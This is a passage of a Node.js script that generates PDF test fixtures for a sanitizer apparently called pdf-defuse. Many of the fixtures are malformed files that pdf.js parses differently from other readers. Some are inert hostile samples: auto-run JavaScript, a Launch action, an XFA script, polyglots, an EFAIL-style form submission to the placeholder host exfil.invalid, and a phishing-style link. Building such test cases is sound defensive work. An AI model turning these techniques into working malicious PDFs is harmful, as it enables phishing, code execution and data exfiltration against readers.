    return whole.subarray(0, whole.lastIndexOf(B(' >>')));
  },
  // All three at once: no header, a cut trailer, and the catalog in it.
  'header-missing-trailer-cut-root-direct.pdf': () =>
    loose(
      '% no PDF header',
      '1 0 obj',
      `<< /Type /Page ${PAGE_FONT} /Contents 2 0 R /MediaBox [0 0 612 792] >>`,
      'endobj',
      `2 0 obj\n<< /Length ${HELLO.length} >>\nstream\n${HELLO}\nendstream\nendobj`,
      'trailer',
      '<< /Root << /Pages << /Kids [1 0 R] /Count 1',
    ),
  // /Pages, or a page on the way to the first or last page, has no usable cross-reference entry.
  'pages-entry-free.pdf': () => setRow(helloDoc().build(), 2, '0000000000 00000 f\r\n'),
  'pages-entry-bad-offset.pdf': () => setRow(helloDoc().build(), 2, '4294967295 00000 n\r\n'),
  // The rows of the page and its content are swapped.
  'page-entry-swapped.pdf': () => {
    const one = helloDoc().build();
    return setRow(setRow(one, 3, rowOf(one, 5)), 5, rowOf(one, 3));
  },
  'page-last-entry-wrong.pdf': () => {
    const b = helloDoc();
    b.set(2, '<< /Type /Pages /Kids [3 0 R 6 0 R] /Count 2 /MediaBox [0 0 612 792] >>');
    b.set(6, '<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents 7 0 R >>');
    b.set(7, { dict: '<< >>', stream: text('World') });
    const two = b.build();
    return setRow(two, 6, rowOf(two, 4));
  },
  // The newest section's /Prev is its own offset, so the older sections stay hidden and the catalog it redefines leads to
  // a page tree with no entry.
  'prev-loop.pdf': () => {
    const first = helloDoc().build();
    const updated = appendUpdate(first, new Map([[1, '<< /Type /Catalog /Pages 2 0 R /PageMode /UseNone >>']]), 1, 6);
    const at = startxref(updated);
    return B(updated.toString('latin1').replace(`/Prev ${startxref(first)} `, `/Prev ${at} `));
  },
  // A stray R where a dictionary key belongs.
  'dict-stray-r.pdf': () => {
    const b = helloDoc();
    b.set(3, '<< R /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R /AA << /O 6 0 R >> >>');
    b.set(6, SCRIPT());
    return b.build();
  },
  // A stream written inside another object: an image kept in /Pages.
  'direct-stream.pdf': () => {
    const image = 'A'.repeat(64);
    const b = helloDoc();
    b.set(
      2,
      `<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> /XObject << /Im1 << /Type /XObject /Subtype /Image /Width 8 /Height 8 /ColorSpace /DeviceGray /BitsPerComponent 8 /Length ${image.length} >>\nstream\n${image}\nendstream >> >> >>`,
    );
    b.set(3, '<< /Type /Page /Parent 2 0 R /Contents 5 0 R >>');
    b.set(5, { dict: '<< >>', stream: `q 200 0 0 200 72 400 cm /Im1 Do Q ${HELLO}` });
    return b.build();
  },
  // Page content written inside the page, with a /Length that ends before "Tj".
  'direct-stream-length-short.pdf': () => {
    const content = '\t\tBT\n\t\t/F1 24 Tf\n\t\t72 720 Td\n\t\t(Hello, direct stream) Tj\n\t\tET';
    const cut = content.indexOf(' Tj');
    const b = new Builder();
    b.root = b.add('<< /Type /Catalog /Pages 2 0 R >>');
    b.add('<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>');
    b.add(`<< /Type /Page /Parent 2 0 R /Contents << /Length ${cut} >>\n\t\tstream\n${content}\n\t\tendstream\n\t/Resources << /Font << /F1 4 0 R >> >> >>`);
    b.add(FONT);
    return b.build();
  },
  // An object stream whose /Type is not /ObjStm. Same length, so offsets stay right.
  'objstm-type-other.pdf': () => B(helloDoc().build({ xref: 'stream', objectStreams: true }).toString('latin1').replace('/Type /ObjStm', '/Type /Potato')),
  // Only the attached files are encrypted.
  'attachments-only.pdf': () => attachmentsOnly(false),
  'attachments-only-script.pdf': () => attachmentsOnly(true),
  // Revision 6 with an empty owner password.
  'r6-owner-empty.pdf': () => encryptR6(helloDoc().build(), utf8('fixture-user'), utf8('')),
  // Fixed in the review of 0.2.0. pdf.js reads a stream written inside a catalog in the trailer of a table, and one
  // written inside an object in an object stream.
  'root-direct-stream-in-trailer.pdf': () => {
    const b = new Builder();
    hello(b);
    const js = 'app.alert("pdf-defuse fixture");';
    return b.build({ rootValue: `<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS << /Length ${js.length} >>\nstream\n${js}\nendstream >> >>` });
  },
  'objstm-direct-stream-script.pdf': () => {
    const js = 'app.alert("pdf-defuse fixture");';
    return streamDoc({
      plain: plainPage({ dict: '<< >>', stream: HELLO }),
      packed: [
        [1, '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>'],
        [6, `<< /S /JavaScript /JS << /Length ${js.length} >>\nstream\n${js}\nendstream >>`],
      ],
      objstm: FLATE,
      xref: FLATE,
    });
  },
  'objstm-page-direct-content.pdf': () =>
    streamDoc({
      plain: [
        [2, '<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>'],
        [4, FONT],
      ],
      packed: [
        [1, '<< /Type /Catalog /Pages 2 0 R >>'],
        [3, `<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents << /Length ${HELLO.length} >>\nstream\n${HELLO}\nendstream >>`],
      ],
      objstm: FLATE,
      xref: FLATE,
    }),
  // Rows pdf.js reads on its way to a page that point at another object, so pdf.js rebuilds the map, which takes a
  // definition of the page that no row names and that runs a script when the page opens.
  'pages-count-entry-wrong.pdf': () => {
    const b = helloDoc();
    b.set(2, '<< /Type /Pages /Kids [3 0 R] /Count 6 0 R /MediaBox [0 0 612 792] >>');
    b.set(6, '1');
    const one = b.build();
    return hiddenDef(setRow(one, 6, rowOf(one, 5)), `3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R /AA << /O ${SCRIPT()} >> >>\nendobj\n`);
  },
  // The node that holds the second page claims none, so pdf.js does not find the last page where /Count puts it and
  // reads every page, meeting a row that points at the font.
  'pages-last-missing-entry-wrong.pdf': () => {
    const b = helloDoc();
    b.set(2, '<< /Type /Pages /Kids [3 0 R 6 0 R] /Count 2 /MediaBox [0 0 612 792] >>');
    b.set(6, '<< /Type /Pages /Parent 2 0 R /Kids [7 0 R] /Count 0 >>');
    b.reserve();
    const two = b.build();
    return hiddenDef(setRow(two, 7, rowOf(two, 4)), `7 0 obj\n<< /Type /Page /Parent 6 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R /AA << /O ${SCRIPT()} >> >>\nendobj\n`);
  },
  // Each kid of the page tree names the array that holds it. pdf.js loops, and the page lookups of 0.2.0 before its
  // review queued every kid of every visit until the process ran out of memory.
  'pages-kids-loop.pdf': () => {
    const b = new Builder();
    b.root = b.add('<< /Type /Catalog /Pages 2 0 R >>');
    b.add('<< /Type /Pages /Kids 3 0 R /Count 5 >>');
    b.add(`[${'<< /Kids 3 0 R >> '.repeat(50)}]`);
    return b.build();
  },

  // Two trailers that each hold a catalog. pdf.js's recovery scan goes from the first to the next startxref or object and
  // never sees the second, so it uses the first, and so does pdf-defuse since the fourth review of 0.2.0.
  'trailers-competing.pdf': () =>
    loose(
      '% two trailers, two page trees',
      '%PDF-1.4',
      `1 0 obj\n<< /Kids [<< /Parent 1 0 R ${PAGE_FONT} /Contents [2 0 R] >>] /Count 1 /MediaBox [0 0 612 792] >>\nendobj`,
      `2 0 obj\n<< >>\nstream\n${text('First trailer')}\nendstream\nendobj`,
      `10 0 obj\n<< /Kids [<< /Parent 10 0 R ${PAGE_FONT} /Contents [20 0 R] >>] /Count 1 /MediaBox [0 0 612 792] >>\nendobj`,
      `20 0 obj\n<< >>\nstream\n${text('Second trailer')}\nendstream\nendobj`,
      'trailer\n<< /Root << /Pages 1 0 R >> >>',
      'trailer\n<< /Root << /Pages 10 0 R >> >>',
      '',
    ),
  // A script in a file pdf.js does not open: a trailer glued to the object before it.
  'script-pdfjs-unreadable.pdf': () => B(`%PDF-1.4\n1 0 obj<</Kids[<</Parent 1 0 R>>]>>trailer<</Root<</Pages 1 0 R/OpenAction${SCRIPT()}>>>>\n`),

  // Fixed in the fourth review of 0.2.0.
  // The newest "trailer" sits in a comment, which pdf.js's recovery scan skips.
  'trailer-in-comment.pdf': () =>
    loose(
      '%PDF-1.4',
      `1 0 obj\n<< /Kids [<< /Parent 1 0 R ${PAGE_FONT} /Contents [2 0 R] >>] /Count 1 /MediaBox [0 0 612 792] >>\nendobj`,
      `2 0 obj\n<< >>\nstream\n${text('Real trailer')}\nendstream\nendobj`,
      `10 0 obj\n<< /Kids [<< /Parent 10 0 R ${PAGE_FONT} /Contents [20 0 R] >>] /Count 1 /MediaBox [0 0 612 792] >>\nendobj`,
      `20 0 obj\n<< >>\nstream\n${text('Commented trailer')}\nendstream\nendobj`,
      'trailer\n<< /Root << /Pages 1 0 R >> >>',
      '% trailer << /Root << /Pages 10 0 R >> >>',
      '',
    ),
  // Text between a "stream" keyword and its EOL. pdf.js starts the body after the EOL, other readers right after the
  // keyword, so "Hidden" shows in some readers and not in pdf.js.
  'stream-keyword-text.pdf': () => {
    const b = helloDoc();
    b.set(3, '<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents [5 0 R 6 0 R 7 0 R] >>');
    b.set(5, '<< /Length 22 >>\nstream\nBT /F1 24 Tf 72 720 Td\nendstream');
    b.set(6, '<< /Length 21 >>\nstream (Hidden) Tj\n(Shown) Tj\nendstream');
    b.set(7, '<< /Length 2 >>\nstream\nET\nendstream');
    return b.build();
  },
  // Page content whose /Length is wrong and whose body ends at "endsteam", which pdf.js takes for "endstream". The
  // text after it shows only in readers that look further.
  'endstream-misspelled.pdf': () => {
    const b = helloDoc();
    b.set(5, `<< /Length 999 >>\nstream\n${text('Shown')}\nendsteam \n${text('Hidden')}\nendstream`);
    return b.build();
  },
  // A table that marks object 6 free, and an /XRefStm that gives it. pdf.js keeps the free row, qpdf takes the stream's.
  'hybrid-free-row.pdf': () => {
    const b = helloDoc('/OpenAction 6 0 R');
    const plain = b.build();
    const at = plain.lastIndexOf(B('xref\n'));
    const def = `6 0 obj\n${SCRIPT()}\nendobj\n`;
    const row = Buffer.alloc(7);
    row[0] = 1;
    row.writeUInt32BE(at, 1);
    const stmAt = at + def.length;
    const stm = Buffer.concat([B('7 0 obj\n<< /Type /XRef /Size 8 /W [1 4 2] /Index [6 1] /Length 7 >>\nstream\n'), row, B('\nendstream\nendobj\n')]);
    const xrefAt = stmAt + stm.length;
    const rows = [1, 2, 3, 4, 5].map(n => rowOf(plain, n)).join('');
    const tail = `xref\n0 8\n0000000000 65535 f\r\n${rows}0000000000 00001 f\r\n${String(stmAt).padStart(10, '0')} 00000 n\r\ntrailer\n<< /Size 8 /Root 1 0 R /XRefStm ${stmAt} >>\nstartxref\n${xrefAt}\n%%EOF\n`;
    return Buffer.concat([plain.subarray(0, at), B(def), stm, B(tail)]);
  },
  // Objects that alternate across nine object streams, each padded to 1 MB once decoded. 0.1.2 kept eight decoded
  // streams, so every lookup decoded one again.
  'objstm-many-streams.pdf': () => manyStreams(9, 40, 1 << 20),
  // The last object in an object stream never closes, and 16 MB of spaces follow it once decoded. Parse windows grew
  // over all of it.
  'objstm-padding.pdf': () => paddedMember('<< /S /JavaScript /JS (app.alert\\(1\\))', 16 << 20),
  // The same with a stream written inside it that has no endstream.
  'objstm-padding-stream.pdf': () => paddedMember('<< /S /JavaScript /JS << /Length 3 >> stream\nabc', 16 << 20),
  // A stream stored as an object in an object stream: the page content and an open-action script. pdf.js reads them from
  // the decoded data, and 0.2.0 before this review read only their dictionaries.
  'objstm-stream-member.pdf': () => {
    const js = 'app.alert("pdf-defuse fixture");';
    return streamDoc({
      plain: [
        [2, '<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>'],
        [3, '<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>'],
        [4, FONT],
      ],
      packed: [
        [1, '<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS 6 0 R >> >>'],
        [5, `<< /Length ${HELLO.length} >>\nstream\n${HELLO}\nendstream`],
        [6, `<< /Length ${js.length} >>\nstream\n${js}\nendstream`],
      ],
      objstm: FLATE,
      xref: FLATE,
    });
  },
  // The entry of object 6 gives index 1 of its object stream, whose header names other numbers. pdf.js reads index 1.
  'objstm-index-lookup.pdf': () =>
    streamDoc({
      plain: plainPage({ dict: '<< >>', stream: HELLO }),
      packed: [
        [1, '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>'],
        [6, SCRIPT()],
      ],
      header: `1 0 9 ${'<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>\n'.length} `,
      objstm: FLATE,
      xref: FLATE,
    }),
  // Object 7's next object starts before it, so pdf.js reads no object from 7 on, and runs no open-action script.
  'objstm-offsets-decrease.pdf': () => {
    const outlines = '<< /Type /Outlines /Count 0 >>';
    return streamDoc({
      plain: [[1, '<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R /Outlines 6 0 R >>'], ...plainPage({ dict: '<< >>', stream: HELLO })],
      packed: [
        [6, outlines],
        [7, SCRIPT()],
        [8, '<< /Other true >>'],
      ],
      header: `6 0 7 ${outlines.length + 1} 8 10 `,
      objstm: FLATE,
      xref: FLATE,
    });
  },
  // A file that encrypts only its attached files, whose page content names their crypt filter, or says it is an
  // embedded file and so takes their filter. pdf.js draws a blank page, since it has no key for either.
  'attachments-only-content.pdf': () => attachmentsOnlyContent('<< /Filter [/Crypt] /DecodeParms [<< /Name /StdCF >>] >>'),
  'attachments-only-content-typed.pdf': () => attachmentsOnlyContent('<< /Type /EmbeddedFile >>'),

  // Rejections that are right: no reader gets a document out of these.
  'unreadable-truncated.pdf': () => B(`${HEADER}1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1\n`),
  'root-invalid.pdf': () => {
    const b = new Builder();
    b.root = b.add('42');
    b.add(FONT);
    return b.build();
  },
  'pages-cycle.pdf': () => {
    const b = new Builder();
    b.root = b.add('<< /Type /Catalog /Pages 2 0 R >>');
    b.add('<< /Type /Pages /Count 1 /Kids [2 0 R] >>');
    return b.build();
  },
  'user-password.pdf': () => qpdf(helloDoc().build(), ['--encrypt', 'fixture-user', 'fixture-owner', '128', '--use-aes=y', '--']),
  // Public-key encryption: nothing opens it without the recipient's certificate. The recipient and the content are
  // placeholder bytes.
  'certificate-encryption.pdf': () => {
    const b = helloDoc();
    b.set(5, { dict: '<< >>', stream: '*'.repeat(48) });
    b.set(
      6,
      `<< /Filter /Adobe.PubSec /SubFilter /adbe.pkcs7.s5 /V 4 /R 131105 /CF << /DefaultCryptFilter << /CFM /AESV2 /Length 128 /Recipients [<${B('placeholder recipient').toString('hex')}>] >> >> /StmF /DefaultCryptFilter /StrF /DefaultCryptFilter >>`,
    );
    return b.build({ trailerExtra: `/Encrypt 6 0 R ${FILE_ID}` });
  },

  // What hostile files do, built without anything that runs or reaches a real host.
  // A script on open, on the page, and on close with an empty /S.
  'js-open-page-close.pdf': () => helloDoc(`/OpenAction ${SCRIPT()} /AA << /WC << /S / /JS (app.alert\\("closing"\\);) >> >>`, `/AA << /O ${SCRIPT('app.alert\\("page open"\\);')} >>`).build(),
  // Only the will-close action with an empty /S, in a tiny file with the catalog in the trailer.
  'will-close-empty-s.pdf': () => B('%PDF-1.4\ntrailer<</Root<</Pages<<>>/AA<</WC<</S//JS(app.alert\\("closing"\\);)>>>>>>>>\n'),
  // A comment before the header, the catalog in the trailer, a script on open.
  'js-open-action-tiny.pdf': () =>
    loose(
      '% a script that runs on open',
      '',
      '%PDF-1.4',
      '',
      '1 0 obj\n<< /Type /Pages /Kids [<< /Type /Page /Parent 1 0 R /MediaBox [0 0 612 792] >>] /Count 1 >>\nendobj',
      '',
      `trailer\n<< /Root << /Pages 1 0 R /OpenAction ${SCRIPT()} >> >>`,
      '',
    ),
  // The script in an ASCII85 stream with no /Length.
  'js-stream-filter.pdf': () =>
    loose(
      '% a script in a filtered stream',
      '%PDF-1.4',
      `1 0 obj\n<< /Filter /ASCII85Decode >>\nstream\n${ascii85('app.alert("pdf-defuse fixture");')}\nendstream\nendobj`,
      'trailer\n<< /Root << /Pages << >> /OpenAction << /S /JavaScript /JS 1 0 R >> >> >>',
      '',
    ),
  // Names written with #xx escapes, and the script with octal escapes and backslash-newline continuations. The page
  // text uses a hex string with spaces, octal escapes and line continuations.
  'js-encoded-names.pdf': () => {
    const b = helloDoc('/O#70enAction << /#53 /J#61va#53cript /#4A#53 (\\141pp.al\\\nert\\050"pdf-de\\\nfuse fixture"\\051;) >>');
    b.set(5, { dict: '<< >>', stream: 'BT /F1 24 Tf 72 720 Td <48 65 6c\n6c 6f> Tj 0 -30 Td (\\110\\145\\154\\154\\157) Tj 0 -30 Td (He\\\nl\\\nlo) Tj ET' });
    return b.build();
  },
  // A Launch action on open whose program is under /Win.
  'launch-win.pdf': () => helloDoc('/OpenAction 6 0 R', '', ['<< /Type /Action /S /Launch /Win << /F (fixture.exe) /P (marker) >> >>']).build(),
  // An XFA field whose initialize event runs a script.
  'xfa-event-script.pdf': () => {
    const xdp = [
      '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">',
      '<template><subform name="form"><pageSet/><field name="greeting"><event activity="initialize">',
      '<script contentType="application/x-javascript">app.alert("pdf-defuse fixture");</script>',
      '</event></field></subform></template>',
      '</xdp:xdp>',
    ].join('\n');
    return loose(
      '% an XFA form',
      '%PDF-1.4',
      `1 0 obj\n<< >>\nstream\n${xdp}\nendstream\nendobj`,
      'trailer\n<< /Root << /AcroForm << /Fields [<< /T (form) /Kids [<< /Subtype /Widget /FT /Btn /T (greeting) /Rect [0 0 0 0] >>] >>] /XFA 1 0 R >> /Pages << >> >> >>',
      '',
    );
  },
  // The PDF half of a PE/PDF polyglot: marker bytes in place of the executable, then the PDF.
  'polyglot-pe.pdf': () =>
    Buffer.concat([
      B('MZ pdf-defuse fixture: marker bytes in place of an executable\n'),
      loose(
        '%PDF-1.4',
        `1 0 obj\n<< /Kids [<< /Parent 1 0 R ${PAGE_FONT} /Contents [2 0 R] >>] /Count 1 >>\nendobj`,
        `2 0 obj\n<< >>\nstream\n${text('PDF/PE fixture')}\nendstream\nendobj`,
        'trailer\n<< /Root << /Pages 1 0 R >> >>',
        '',
      ),
    ]),
  // A PDF/ZIP polyglot: a ZIP archive of one marker file after %%EOF.
  'polyglot-zip.pdf': () => Buffer.concat([helloDoc().build(), zipOf('marker.txt', 'pdf-defuse fixture marker\n')]),
  // EFAIL's layout: each line of PDF ends in a comment that swallows the next block, so the file survives a CBC gadget.
  // It holds nothing that could send anything anywhere.
  'efail-layout.pdf': () =>
    efailBlocks(['%PDF-1.', '1 0 obj<<', '/Pages 2 0 R', '>>endobj', '2 0 obj<<', '/Kids[3 0 R]', '/Count 1', '>>endobj', '3 0 obj<<', '/Parent 2 0 R', '>>endobj', 'trailer <<', '/Root 1 0 R>>']),
  // The same layout with a channel out: the page submits the form to a placeholder host when it opens.
  'efail-exfil.pdf': () =>
    efailBlocks(
      [
        '%PDF-1.',
        '1 0 obj<<',
        '/Pages 2 0 R',
        '>>endobj',
        '2 0 obj<<',
        '/Kids[3 0 R]',
        '/Count 1',
        '>>endobj',
        '3 0 obj<<',
        '/Parent 2 0 R',
        '/AA<</O 4 0 R',
        '>>>>endobj',
        'trailer <<',
        '/Root 1 0 R>>',
      ],
      '4 0 obj\n<< /S /SubmitForm /F << /FS /URL /F (http://exfil.invalid/collect) >> /Flags 4 >>\nendobj\n',
    ),
  // A link to a bare IP address. 192.0.2.0/24 is reserved for documentation.
  'link-ip-host.pdf': () => helloDoc('', '/Annots [6 0 R]', [LINK('<< /S /URI /URI (http://192.0.2.10/bill/view) >>')]).build(),
  // A phishing link: plain https to a host that is not the brand it claims. .example is reserved.
  'link-phishing-https.pdf': () => helloDoc('', '/Annots [6 0 R]', [LINK('<< /S /URI /URI (https://account-verify.example/signin) >>')]).build(),

  // Defects fixed before 0.1.0.
  // A later revision replaces the page content. The older definition belongs to INCREMENTAL_UPDATES, not SHADOWED_OBJECTS.
  'incremental-replace.pdf': () => {
    const b = helloDoc();
    b.set(5, { dict: '<< >>', stream: text('Old') });
    return appendUpdate(b.build(), new Map([[5, { dict: '<< >>', stream: text('New') }]]), 1, 6);
  },
  // Microsoft Print to PDF writes every cross-reference offset one byte early.
  'xref-offsets-early.pdf': () =>
    earlyOffsets([
      '<< /Type /Catalog /Pages 2 0 R >>',
      '<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 612 792] >>',
      '<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>',
      FONT,
      `<< /Length ${HELLO.length} >>\nstream\n${HELLO}\nendstream`,
    ]),
  // An attached CSV file with a formula cell the CSV plugin escapes, so the plugin hands back new bytes to write.
  'attached-csv-formula.pdf': () => attachment('report.csv', 'text#2Fcsv', 'host,score\nweb01,=1+1\n'),
};

const casesDir = path.join(dir, 'cases');
fs.mkdirSync(casesDir, { recursive: true });
for (const f of fs.readdirSync(casesDir)) if (f.endsWith('.pdf') && !(f in cases)) fs.rmSync(path.join(casesDir, f));
let total = 0;
for (const [name, build] of Object.entries(cases)) {
  const out = build();
  fs.writeFileSync(path.join(casesDir, name), out);
  total += out.length;
}
console.log('wrote', Object.keys(cases).length, 'files to test/fixtures/cases,', total, 'bytes');
